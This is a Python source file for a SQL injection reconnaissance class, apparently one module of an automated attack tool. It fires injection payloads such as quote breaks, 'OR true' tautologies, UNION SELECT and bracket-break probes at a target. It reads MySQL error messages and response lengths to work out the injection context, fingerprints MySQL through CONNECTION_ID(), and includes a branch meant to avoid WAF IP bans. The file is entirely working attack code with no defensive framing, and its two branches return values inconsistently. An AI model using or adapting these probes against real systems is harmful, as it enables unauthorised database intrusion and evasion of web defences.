import random
import re

class ContextDiscoverer:
    def __init__(self, client, disable_strings=True):
        self.client = client
        self.disable_strings = disable_strings
        self.probes = [
            {"name": "bracket_single", "payload": " )", "weight": 1.0},
            {"name": "order_by", "payload": " ORDER BY 1--", "weight": 1.0},
            {"name": "union_probe", "payload": " UNION SELECT NULL--", "weight": 1.0},
        ]
        self.detected_context = "UNKNOWN"

    def discover(self):
        print("[*] Phase: Context Discovery (The Eye) active.", flush=True)
        
        # 1. Baseline Request
        baseline = self.client.send_request("")
        baseline_len = len(baseline['text'])
        
        # 2. Logic-Based Pulse Checking (Intelligent Context Discovery)
        print("  [?] Probing: Direct Logic Pulse (NUMERIC vs STRING)...", flush=True)
        
        pulse_num = self.client.send_request(" OR true -- -")
        len_num = len(pulse_num['text'])
        
        if self.disable_strings:
            # Skip all quote-based probes to avoid WAF IP bans or application crashes.
            pulse_backslash_break = self.client.send_request("\\")
            if self._check_sql_errors(pulse_backslash_break['text']):
                 print("  [WARNING] Detected strict quote sanitation via Backslash. Switching to QUOTELESS context.", flush=True)
                 self.detected_context = "QUOTELESS_STRING" 
            elif len_num != baseline_len and not self._check_sql_errors(pulse_num['text']):
                 self.detected_context = "NUMERIC"
            else:
                 self.detected_context = "QUOTELESS_STRING" # Fallback to safest route
            
            print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)
            return
            
        # Rest of standard discovery...
        pulse_sq = self.client.send_request("' OR true -- -")
        pulse_sq_break = self.client.send_request("'")
        pulse_backslash_break = self.client.send_request("\\")
        
        len_sq = len(pulse_sq['text'])
        
        if self._check_sql_errors(pulse_sq_break['text']):
            self.detected_context = "SINGLE_QUOTE"
        elif len_num != baseline_len and not self._check_sql_errors(pulse_num['text']):
            self.detected_context = "NUMERIC"
        elif self._check_sql_errors(pulse_backslash_break['text']) and not self._check_sql_errors(pulse_sq_break['text']):
            print("  [WARNING] Detected strict quote sanitation (likely replaced with /). Switching to QUOTELESS context.", flush=True)
            self.detected_context = "QUOTELESS_STRING" 
        elif len_sq != baseline_len and not self._check_sql_errors(pulse_sq['text']):
            self.detected_context = "SINGLE_QUOTE"
        else:
            self.detected_context = "SINGLE_QUOTE"

        print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)

        # 3. Structural Brackets inference
        print("  [?] Probing: Structural Brackets inference...", flush=True)
        # Using a logical break format: ) OR true -- -
        logical_prefix = ")" if self.detected_context == "NUMERIC" else "')"
        bracket_probe = f"{logical_prefix} OR true -- -"
        
        bracket_res = self.client.send_request(bracket_probe)
        if not self._check_sql_errors(bracket_res['text']) and len(bracket_res['text']) != baseline_len:
            self.detected_context += "_PARENTHESIS"
            print(f"  [+] Refined Context: {self.detected_context}", flush=True)
        
        # 4. MySQL Fingerprinting (Exclusive Specialization)
        db_type = self.fingerprint_mysql()
        return {"context": self.detected_context, "db_type": db_type}

    def fingerprint_mysql(self):
        """Exclusively validates and fingerprints MySQL environments."""
        print("[*] Phase: MySQL Validation Active.", flush=True)
        
        # MySQL specific probes:
        # CONNECTION_ID(), @@version, SLEEP()
        print(f"  [?] Checking for MySQL execution signature...", flush=True)
        
        # Safe logical check using purely MySQL functions
        logical_prefix = "" 
        if self.detected_context == "NUMERIC":
            logical_prefix = " AND "
        elif self.detected_context == "SINGLE_QUOTE":
            logical_prefix = "' AND "
        elif self.detected_context == "DOUBLE_QUOTE":
            logical_prefix = "\" AND "
        else:
            logical_prefix = " AND "
            
        # Verify CONNECTION_ID() executes without error and matches logic
        payload = f"{logical_prefix} CONNECTION_ID() IS NOT NULL -- -"
        
        res = self.client.send_request(payload)
        status = "MySQL (Confirmed)" if not self._check_sql_errors(res['text']) else "MySQL (Presumed)"
        print(f"  [+] Match found: Target is {status}", flush=True)
        return status

    def _check_sql_errors(self, text):
        # Optimized specifically for MySQL syntax errors
        error_patterns = [
            r"You have an error in your SQL syntax",
            r"mysql_fetch_",
            r"Warning: mysql_",
            r"Table '\w+' doesn't exist",
            r"Unknown column",
            r"SQL syntax.*MySQL",
            r"valid MySQL result"
        ]
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
